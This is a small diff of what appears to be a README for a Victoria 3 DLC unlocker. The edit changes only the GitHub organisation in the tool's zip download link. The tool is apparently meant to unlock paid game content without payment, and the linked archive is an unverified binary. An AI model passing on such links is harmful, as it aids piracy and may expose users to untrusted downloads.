@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.1.1+ Release](https://github.com/Victoria-3-DLC-Unlocker/.github/releases/download/1.15/victoria3-dlc-unlocker.zip) = `*Tool files & folder*`
+- [💾 v.1.1+ Release](https://github.com/Victoria-3-DLC-Manager/.github/releases/download/1.15/victoria3-dlc-unlocker.zip) = `*Tool files & folder*`
 
 ---
 
